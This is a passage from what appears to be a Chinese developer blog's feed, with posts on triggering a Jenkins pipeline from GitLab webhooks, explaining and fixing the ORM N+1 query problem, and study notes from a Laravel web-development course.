        <content type="html"><![CDATA[<blockquote><p>Jenkins 是什么？</p></blockquote><p>Jenkins是一个开源的、提供友好操作界面的持续集成(CI)工具。</p><a id="more"></a><blockquote><p>Jenkins 如何与Gitlab 进行关联？</p></blockquote><p>可以通过生成密钥（Webhooks 的钩子），然后到Gitlab 需要集成的项目中，设置集成功能，增加Web 钩子。</p><p>这样当进行Push 动作时，就会触发Jenkins 进行构建，然后执行相应的流水线。</p><p>对于小公司而言，开发服务器常用的架构是内网服务器（本地机器）+外网服务器内网穿透，Jenkins + 私有Gitlab 持续集成。</p><p>背景：Jenkins 和Gitlab 部署在外网服务器上，通过内网穿透对内网服务器（开发服务器）进行访问。<br>需求描述：每次进行Push 时，触发Jenkins 流水线，进行构建，将最新的版本同步到开发服务器上。</p><p>Jenkins的功能很强大，这里并不打算深入拓展，而是介绍一种相较简单粗暴的方式去完成持续集成。</p><h2 id="创建任务"><a href="#创建任务" class="headerlink" title="创建任务"></a>创建任务</h2><p>首先需要在Jenkins 上新建任务，因为需求并不复杂，这里直接选择流水线的方式</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316144137.png" alt=""></p><p>如果需要关联TAPD，这里需要「关联TAPD」填上对应TAPD 的ID。</p><p>核心的配置在构建触发器这一块，根据Push 事件，触发执行流水线。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316144851.png" alt=""></p><p>有以下几个点需要注意：</p><ol><li>因为是开发服务器，并没有开启合并请求。</li><li>Gitlab webhook URL 需要记住，后面会用到。</li><li>默认允许所有分支，如果有特殊需求，可以指定分支名进行过滤。</li><li>点击右下角的Generate 按钮生成Secret token，后面会用到。</li></ol><p>配置流水线：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316220105.png" alt=""></p><p>上半部分是连接内网服务器（开发服务器）的基础信息，下半的配置信息是需要执行的构建脚本。</p><p>构建脚本的作用其实就是去执行<code>git pull</code> 这个动作，大概长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">pull() &#123;</span><br><span class="line">    cd &#x2F;var&#x2F;www&#x2F;project &amp;&amp; git pull</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pull</span><br></pre></td></tr></table></figure><details><summary>流水线配置，点击查看详情信息</summary><pre>def bdService() {    def remote = [:]    remote.name = 'hostname'    remote.host = 'localhost'    remote.port = 22    remote.user = 'username'    remote.password = 'password'    remote.allowAnyHosts = true    return remote}pipeline {    agent any    stages {        stage('代码集成') {            steps {                script {                    def  remote = bdService();                    sshCommand remote: remote, command: "/bin/bash /opt/shell/build.sh"                }            }        }    }}</details><p>配置完成之后，点击保存。</p><p>返回工作态，找到对应任务，点击立即构建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316220845.png" alt=""></p><p>通过构建历史，查看<code>Console Output</code>，能看到类似输出则表示构建成功。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316220912.png" alt=""></p><p>构建成功之后，就可以与Gitlab 进行关联了，点击项目=&gt;设置=&gt;集成。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210316220941.png" alt=""></p><p>链接（URL）是之前的 Webhook url，安全令牌则是上面生成的 Secret token，SSL 证书验证视情况选择是否开启，然后点击增加Web 钩子。</p><p>至此所有的配置就基本完成了，这时可以去测试Push，看看是否会执行自动构建。</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Jenkins </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> CI </tag>
            
            <tag> Jenkins </tag>
            
            <tag> CD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是 N+1 问题，以及如何解决</title>
      <link href="/what-is-the-n-1-problem-and-how-to-solve-it/"/>
      <url>/what-is-the-n-1-problem-and-how-to-solve-it/</url>
      
        <content type="html"><![CDATA[<p><code>N+1</code> 是ORM（对象关系映射）关联数据读取中存在的一个问题。</p><a id="more"></a><p>在介绍什么是<code>N+1</code>问题之前，首先思考一个问题：</p><p>假设现在有一个用户表（User）和一个余额表（Balance），这两个表通过<code>user_id</code>进行关联。现在有一个需求是<strong>查询年龄大于18岁的用户，以及用户各自的余额</strong>。</p><p>这个问题并不难，但对于新手而言，可能常常会犯的一个错误就是在循环中进行查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$users &#x3D; User::where(&quot;age&quot;, &quot;&gt;&quot;, 18)-&gt;select();</span><br><span class="line">foreach($users as $user)&#123;</span><br><span class="line">  $balance &#x3D; User::getFieldByUserId($user-&gt;user_id, &quot;balance&quot;);</span><br><span class="line">  $user[&#39;balance&#39;] &#x3D; $balance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样做是非常糟糕的，数据量小还少，在数据量较大的情况下，是非常消耗数据库性能的。</p><p>通过Mysql 查询日志，可以看到查询用户表是一次，因为有四个符合该条件的用户，查询用户表关联的余额表是四次。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210314132050.png" alt=""></p><p><code>N+1</code>问题就是这样产生的：查询主表是一次，查询出N 条记录，根据这N 条记录，查询关联的副（从）表，共需要N 次。所以，应该叫<code>1+N</code> 问题更合适一些。</p><p>其实，如果稍微了解一点SQL，根本不用这么麻烦，直接使用<code>JOIN</code> 一次就搞定了。</p><p>对于这类问题，ORM 其实为我们提供了相应的方案，那就是使用『预加载功能』。</p><h3 id="预加载功能"><a href="#预加载功能" class="headerlink" title="预加载功能"></a>预加载功能</h3><p>使用<code>with()</code>方法指定想要预加载的关联：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$users &#x3D; User::where(&quot;age&quot;, &quot;&gt;&quot;, 18)</span><br><span class="line">-&gt;with(&quot;hasBalance&quot;)</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure><p><code>hasBalance</code> 是什么呢？</p><p>它是在<code>User</code>模型中定义的一个方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class User extends Model</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;  ...</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; User模型与Balance 模型进行一对一关联</span><br><span class="line">    public function hasBalance()</span><br><span class="line">    &#123;</span><br><span class="line">      return $this-&gt;hasOne(Balance::class, &quot;user_id&quot;, &quot;user_id&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这个方法让<code>User</code> 模型与<code>Balance</code> 模型进行一对一关联。</p><p>现在再来看一下Mysql 的查询日志：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210314133535.png" alt=""></p><p>可以很清楚的看到，总查询次数由原来的<code>1+N</code> 变成了现在的<code>1+1</code>。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>N+1</code> 问题是什么？会造成什么影响？应该如何解决？</p><ol><li>执行一次查询获取N 条主数据后，由于关联引起的执行N 次查询从数据</li><li>带来了不必要的查询开销</li><li>可以通过框架 ORM 自带的<code>with</code> 去解决</li></ol>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L01 Laravel 教程- Web 开发实战入门课程笔记</title>
      <link href="/laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development/"/>
      <url>/laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development/</url>
      
        <content type="html"><![CDATA[<p><a href="https://learnku.com/courses/laravel-essential-training/8.x" target="_blank" rel="noopener">L01 Laravel 教程- Web 开发实战入门</a>课程笔记。</p><a id="more"></a><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><p>构建应用（8.*）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ composer create-project laravel&#x2F;laravel weibo --prefer-dist &quot;8.*&quot;</span><br></pre></td></tr></table></figure><p>构建应用（5.*）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ composer create-project laravel&#x2F;laravel Laravel --prefer-dist &quot;5.7.*&quot;</span><br></pre></td></tr></table></figure><p>Ubuntu 中查看所有PHP 版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ update-alternatives --display php</span><br></pre></td></tr></table></figure><p>Ubuntu 中快速切换PHP 版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo update-alternatives --config php</span><br></pre></td></tr></table></figure><p>工作原理：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210314120650.png" alt=""></p><p>注意事项：</p><ol><li>路由的服务提供者类中设置命名空间</li><li><code>blade.php</code> 是Laravel 的一套模版引擎，有自己的一套规则，通过继承父视图，可以减少很多重复代码</li><li><code>art tinker</code> 是 Laravel 框架自带的命令，用以调出 Laravel 的交互式运行时</li></ol><h2 id="artisan-命令"><a href="#artisan-命令" class="headerlink" title="artisan 命令"></a>artisan 命令</h2><p><a href="https://learnku.com/docs/laravel/6.x/artisan" target="_blank" rel="noopener">Artisan</a> 是 Laravel 提供的 CLI（命令行接口）。</p><p>常用命令如下：<br>|命令|说明|<br>|-|-|<br>|php artisan key:generate|生成App Key|<br>|php artisan make:controller|生成控制器|<br>|php artisan make:model|生成模型|<br>|php artisan make:policy|生成授权策略|<br>|php artisan make:seeder|生成Seeder 文件|<br>|php artisan migrate|执行迁移|<br>|php artisan migrate:rollback|回滚迁移|<br>|php artisan migrate:refresh|重置数据库|<br>|php artisan db:seed|填充数据库|<br>|php artisan migrate:refresh –seed|进行数据库迁移同时填充数据库|<br>|php artisan tinker|进入tinker 环境|<br>|php artisan route:list|查看路由列表|</p><h2 id="第一章学到了什么"><a href="#第一章学到了什么" class="headerlink" title="第一章学到了什么"></a>第一章学到了什么</h2><ul><li>如何构建一个Laravel 应用</li><li>对新建的Laravel 项目进行基本配置</li><li>手动创建控制器、静态视图</li><li>了解路由、控制器、视图的基本协作方式</li><li>了解如何使用通用视图</li><li>了解Artisan 命令的基本使用</li></ul><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ composer require laravel&#x2F;ui:^3.0 --dev</span><br></pre></td></tr></table></figure><p><code>composer require</code> 命令是用来安装扩展包的命令，参数<code>--dev</code>表示仅仅只在开发环境中使用。</p><p>上面命令安装完成之后，使用以下命令来引入 bootstrap：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan ui bootstrap</span><br></pre></td></tr></table></figure><p>建议使用<code>yarn</code>命令代替<code>npm</code> 命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yarn install</span><br></pre></td></tr></table></figure><p>前端代码编译出现问题时，可以尝试将<code>node_moudles</code>文件夹删除，再次安装相关依赖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm run watch-poll</span><br></pre></td></tr></table></figure><p>上面这条命令的作用其实就是监视前端文件变化，如果有变化的话，就马上编译。</p><blockquote><p>生成环境中，为什么不用一直开启这个命令？</p></blockquote><p>这是因为服务端只需要手动编译一次就好，也就是使用<code>npm run dev</code>命令。</p><p>之所以说Laravel 是全栈框架，就是因为它在一个项目中把前端和后端所有东西都包揽了。</p><h3 id="Laravel-的前端工作流"><a href="#Laravel-的前端工作流" class="headerlink" title="Laravel 的前端工作流"></a>Laravel 的前端工作流</h3><p>Laravel 的前端工作流是通过 Sass、NPM、Yarn、Laravel Mix 构成一套前端工作流。</p><ul><li><code>Sass</code> 是一种可用于编写CSS 的语言。</li><li><code>Yarn</code> 是一个用于代替NPM 客户端的新的包管理器。</li><li><code>Laravel Mix</code> 是一个前端任务自动化管理工具。<code>Laravel Mix</code> 可以自动编译<code>resources</code>下面的文件。</li><li><code>双括号</code> 是在Html 中内嵌PHP 的Blade 语法，表示包含在该区域内的代码使用PHP 来编译执行。</li></ul><h3 id="第二章学到了什么"><a href="#第二章学到了什么" class="headerlink" title="第二章学到了什么"></a>第二章学到了什么</h3><ol><li>Laravel 的前端工作流</li><li>局部视图的订单和引用</li><li>命名路由的定义和使用</li></ol><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="Eloquent-ORM"><a href="#Eloquent-ORM" class="headerlink" title="Eloquent ORM"></a>Eloquent ORM</h3><p>其特点是一个模型对应数据库中的一个表。</p><p>在进行数据库迁移时，<code>up</code> 方法会被调用，在进行数据库回滚时，<code>down</code>方法会被调用。</p><p>所以无论是初次创建表，还是后面增加字段，都需要去<code>up</code> 方法下进行定义，这样在数据库迁移时才会生效。</p><p>创建一张表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:migration create_followers_table --create&#x3D;&quot;followers&quot;</span><br></pre></td></tr></table></figure><p>增加一个字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:migration add_activation_to_users_table --table&#x3D;users</span><br></pre></td></tr></table></figure><p>数据库的回滚与迁移直接对应着 <code>databases</code> 文件夹下的迁移文件。</p><p>创建模型的同时并进行迁移：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:model Model&#x2F;Articles -m</span><br></pre></td></tr></table></figure><p>可以使用以下命令进行数据库交互：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan tinker</span><br></pre></td></tr></table></figure><p>该命令可以进入Eloquent 模型，直接进行数据库交互。在该模式下，Eloquent 模型的方法均可以使用。</p><h3 id="第三章学到了什么？"><a href="#第三章学到了什么？" class="headerlink" title="第三章学到了什么？"></a>第三章学到了什么？</h3><ol><li>Eloquent 模型的定义与应用</li><li>数据库迁移与回滚（数据表生成与删除）</li><li>模型的创建与使用</li><li>tinker 的使用</li></ol><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><p>在本地可以这样访问Homestead 的数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uhomestead -h127.0.0.1 -P33060 -p &#x2F;&#x2F; 或者 mysql -uhomestead -h192.168.10.10 -P3306 -p</span><br></pre></td></tr></table></figure><p>但是在项目（Homestead）中，只能这样访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uhomestead -h127.0.0.1 -P3360 -p &#x2F;&#x2F; 或者 mysql -uhomestead -h192.168.10.10 -P3306 -p</span><br></pre></td></tr></table></figure><p>因为端口做了映射（Homestead 3306=&gt; 主机 33060），而项目又运行在Homestead 中，所以项目配置中的端口不能写成<code>33060</code>，否则无法正常访问。</p><h3 id="隐形路由绑定"><a href="#隐形路由绑定" class="headerlink" title="隐形路由绑定"></a>隐形路由绑定</h3><p>这个『隐形路由绑定』倒底是个啥玩意？简单理解就是通过控制器把模型绑定在路由中了。</p><p>路由代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&#39;&#x2F;users&#x2F;&#123;user&#125;&#39;, &#39;UsersController@show&#39;)-&gt;name(&#39;users.show&#39;);</span><br></pre></td></tr></table></figure><p>控制器及模型代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use App\Models\User;</span><br><span class="line"></span><br><span class="line">public function show (User $user)&#123;</span><br><span class="line">  return view(&quot;users.show&quot;, compact(&quot;user&quot;)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码有很多知识点：</p><ol><li>控制器方法<code>show</code> 是通过路由获取的</li><li><code>User $user</code> 是定义在控制器中的方法的Eloquent 模型类型声明</li><li>由于show 方法传参时声明了类型——Eloquent 模型，对应的变量名<code>$user</code> 会匹配路由片段中的<code>{user}</code>，这样Laravel 会自动注入与请求URL 传入的ID 对应的用户模型实例。</li></ol><p>这里利用了隐形路由绑定，直接读取对应ID 的用户的实例。</p><p>其实这个和ThinkPHP 中的路由传参很像，只不过不同的是ThinkPHP 中没有定义模型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&#39;hello&#x2F;:name&#39;, &#39;index&#x2F;hello&#39;);</span><br><span class="line"></span><br><span class="line">public function hello($name)&#123;</span><br><span class="line">  return $name;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Laravel 是如何接收前端的参数的？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function sotre(Request $request)&#123;</span><br><span class="line">  &#x2F;&#x2F; 通过使用Illuminate\Http\Request 实例来接收用户输入</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第四章学到了什么"><a href="#第四章学到了什么" class="headerlink" title="第四章学到了什么"></a>第四章学到了什么</h3><ol><li>使用RESTFUL 来构建路由资源</li><li>通过表单与控制器协同处理数据</li><li>验证表单提交的数据，并返回相应的内容</li><li>利用Composer 安装相应扩展包</li><li>使用闪存来展示用户信息</li></ol><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><p>Laravel 提供了<code>attempt</code> 方法用于登录验证。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (Auth::attempt([&#39;email&#39; &#x3D;&gt; $email, &#39;password&#39; &#x3D;&gt; $password])) &#123;</span><br><span class="line">    &#x2F;&#x2F; 该用户存在于数据库，且邮箱和密码相符合</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>attempt</code> 方法接收一个数组作为第一个参数，会去数据库中找寻对应的值，逻辑如下：</p><ol><li>找寻<code>email</code>字段匹配的值</li><li>如果没找到，直接返回false</li><li>如果能找到：<br>i. 先将传参password进行加密，与数据库中的值进行比对<br>ii. 如果两个值匹配，会创建一个会话给验证通过的用户，在会话创建的同时，也会种下一个名为 laravel_session 的 HTTP Cookie，以此 Cookie 来记录用户登录状态，最终返回 true<br>iii. 如果不匹配，返回false</li></ol><p>登录成功之后，可以使用<code>Auth::user()</code> 获取用户信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&#39;login&#39;, &#39;SessionsController@create&#39;)-&gt;name(&#39;login&#39;);</span><br></pre></td></tr></table></figure><p>通过<code>name()</code> 方法定义路由名称，这样需要访问该路由时，直接访问该名称就好。</p><h3 id="第五章学到了什么"><a href="#第五章学到了什么" class="headerlink" title="第五章学到了什么"></a>第五章学到了什么</h3><ol><li>Auth 认证的使用</li><li>了解Laravel 常用登录机制的具体实现</li><li>集成Bootstrap Javascript 组件</li><li>通过 “记住我” 来记住用户登录状态</li></ol><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><p>通常开发编辑用户时，需要先从数据库中获取到该用户当前的信息，然后再进行编辑。</p><p>在Laravel 中，只需要几行代码就可以完成这件事情。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function edit(User $user)&#123;</span><br><span class="line">  return view(&quot;users.edit&quot;, compact(&quot;user&quot;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里通过『隐形路由绑定』，把对应ID 的用户的实例作为控制器参数。</p><h3 id="中间件访问限制"><a href="#中间件访问限制" class="headerlink" title="中间件访问限制"></a>中间件访问限制</h3><p>有时我们会希望未登录的用户，不能访问某些功能，这时可以通过 Auth 提供的中间很方便的完成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;middleware(&quot;auth&quot;, [</span><br><span class="line">    &#x2F;&#x2F; 指定这几个方法不使用Auth 去验证</span><br><span class="line">    &quot;except&quot; &#x3D;&gt; [&quot;show&quot;, &quot;create&quot;, &quot;store&quot;, &quot;index&quot;, &quot;confirmEmail&quot;]</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h3 id="授权验证"><a href="#授权验证" class="headerlink" title="授权验证"></a>授权验证</h3><p>但需要注意的时，这里仅仅限制的是未登录，而有些功能则是需要在登录状态下进行限制，比如：ID 为1 的用户不能修改ID 为2 的用户的信息。</p><p>这个就不是中间件职责范围内能做的事情了，这个需要授权策略来完成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 定义策略</span><br><span class="line">public function update(User $currentUser, User $user)</span><br><span class="line">&#123;</span><br><span class="line">    return $currentUser-&gt;id &#x3D;&#x3D;&#x3D; $user-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还需要在控制器中验证才算正真使用了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用策略</span><br><span class="line">public function update(User $user)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;authorize(&quot;update&quot;, $user);</span><br><span class="line">    &#x2F;&#x2F; ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据填充"><a href="#数据填充" class="headerlink" title="数据填充"></a>数据填充</h3><p>数据填充需要使用Seeder 类，如果需要进行数据填充，需要调用 Seeder 的call 方法。</p><p>以用户模型为例，填充步骤如下：</p><ol><li><p>首先创建用户工厂，定义填充数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:factory UserFactroy</span><br></pre></td></tr></table></figure></li><li><p>创建用户生成器，实现run 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:seeder UsersTableSeeder</span><br></pre></td></tr></table></figure></li><li><p>在DatabaseSeeder 类中实现run 方法，调用 call 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function run()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; \App\Models\User::factory(10)-&gt;create();</span><br><span class="line">    Model::unguard();</span><br><span class="line"></span><br><span class="line">    $this-&gt;call(UsersTableSeeder::class);</span><br><span class="line">  </span><br><span class="line">    Model::reguard();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重置数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan migrate:refresh</span><br></pre></td></tr></table></figure></li><li><p>填充数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan db:seed</span><br></pre></td></tr></table></figure></li></ol><h3 id="第六章学到了什么"><a href="#第六章学到了什么" class="headerlink" title="第六章学到了什么"></a>第六章学到了什么</h3><ol><li>通过路由传参与控制器进行交互（隐形路由绑定</li><li>使用Patch 动作更新用户信息，Delete 动作删除用户</li><li>使用Auth 中间件过滤用户请求、guest 中间件</li><li>使用权限策略，对一些必要的动作进行权限验证</li><li>使用数据填充来生成假数据</li><li>重置数据库以及迁移数据库并生成新数据</li><li>通过数据库迁移来进行数据库字段的更新</li></ol><h3 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h3><p>什么时候应该在控制器中增加<code>User $user</code> 这样的代码呢？</p><p>看路由，看路由，看路由，看路由是如何定义的。</p><p>如果路由中有这样的东西，那么一定要是要的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&quot;&#x2F;users&#x2F;&#123;user&#125;&quot;, &quot;UserController@show&quot;)-&gt;name(&quot;users.show&quot;);</span><br></pre></td></tr></table></figure><p>这是为什么呢？因为隐形路由绑定。</p><p>这里还有一个细节就是如何判断一个路由或者一个控制器是否是隐形路由绑定？<br>除了只是看路由之外，还需要看是否有与之对应的模型。这一点很重要哦。</p><p>另外什么时候需要<code>Request $request</code> 呢？也是看路由，Post 方法一定需要的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 定义路由</span><br><span class="line">Route::get(&quot;password&#x2F;&#123;token&#125;&quot;, &quot;PasswordController@showResetForm&quot;)-&gt;name(&quot;password.reset&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 方式一</span><br><span class="line">public function showResetForm($token)&#123;</span><br><span class="line">  var_dump($token);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 方式二</span><br><span class="line">public function showResetForm(Request $request)&#123;</span><br><span class="line">  $token &#x3D; $request-&gt;route()-&gt;parameter(&#39;token&#39;);</span><br><span class="line">  var_dump($token);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Laravel 中的几种操作数据库的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public function store(User $user)&#123;</span><br><span class="line">  &#x2F;&#x2F; 方式一</span><br><span class="line">  $user-&gt;name &#x3D; &quot;boo&quot;;</span><br><span class="line">  $user-&gt;save();</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 方式二</span><br><span class="line">  $user-&gt;update([</span><br><span class="line">    &quot;name&quot; &#x3D;&gt; &quot;boo&quot;,</span><br><span class="line">  ]);</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 方式三</span><br><span class="line">  User::where(&quot;id&quot;, $user-&gt;id)-&gt;update([</span><br><span class="line">    &quot;name&quot; &#x3D;&gt; &quot;boo&quot;,</span><br><span class="line">  ]);</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 方式四</span><br><span class="line">  DB::table(&quot;users&quot;)-&gt;where(&quot;id&quot;, $user-&gt;id)-&gt;update([</span><br><span class="line">    &quot;name&quot; &#x3D;&gt; &quot;boo&quot;,</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第七章学到了什么"><a href="#第七章学到了什么" class="headerlink" title="第七章学到了什么"></a>第七章学到了什么</h3><ul><li>使用迁移为数据库表增加字段</li><li>在模型中，定义监听器，监听操作</li><li>使用Laravel 发送邮件功能</li><li>在本地（log）调试发送邮件功能</li><li>通过邮件发送注册链接来激活用户</li><li>通过邮件来找回密码</li></ul><h2 